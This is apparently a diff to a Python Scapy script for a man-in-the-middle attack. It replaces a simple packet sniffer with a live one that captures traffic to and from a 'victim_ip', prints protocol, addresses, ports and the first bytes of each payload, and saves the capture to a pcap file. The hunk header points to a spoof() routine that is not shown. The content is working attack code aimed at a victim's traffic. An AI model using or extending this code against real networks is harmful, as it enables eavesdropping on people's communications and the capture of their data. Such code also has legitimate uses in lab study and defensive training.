@@ -62,10 +62,52 @@ def spoof():
         sys.exit(0)
 
 # Sniff packets
-def packet_sniffer():
+'''def packet_sniffer():
     print("[+] Starting packet capture...")
     packets = sniff(filter=f"ip host {victim_ip}", count=0, store=True)
     wrpcap("capture.pcap", packets)
+'''
+
+
+def packet_sniffer():
+    print("[+] Starting live packet capture... (Press Ctrl+C to stop)")
+
+    # Create an empty list to store packets for PCAP
+    packets = []
+
+    # This function runs every time a packet arrives
+    def process_packet(pkt):
+        packets.append(pkt)  # Save to PCAP
+
+        if pkt.haslayer("IP"):
+            ip_layer = pkt.getlayer("IP")
+            proto = "TCP" if pkt.haslayer("TCP") else "UDP" if pkt.haslayer("UDP") else "Other"
+            src = ip_layer.src
+            dst = ip_layer.dst
+            sport = pkt.sport if pkt.haslayer("TCP") or pkt.haslayer("UDP") else "-"
+            dport = pkt.dport if pkt.haslayer("TCP") or pkt.haslayer("UDP") else "-"
+            summary = f"{proto} {src}:{sport} -> {dst}:{dport}"
+
+            # Optionally show some payload (only first 20 bytes)
+            raw_data = ""
+            if pkt.haslayer("Raw"):
+                raw_data = pkt.getlayer("Raw").load[:20]
+                try:
+                    raw_data = raw_data.decode(errors="ignore")
+                except:
+                    raw_data = repr(raw_data)
+
+                summary += f" | Data: {raw_data}"
+
+            print(summary)
+
+    # Start sniffing packets targeting the victim
+    sniff(filter=f"ip host {victim_ip}", prn=process_packet, store=False)
+
+    # Save all captured packets when done
+    wrpcap("capture.pcap", packets)
+
+
 
 # Main execution
 if __name__ == "__main__":
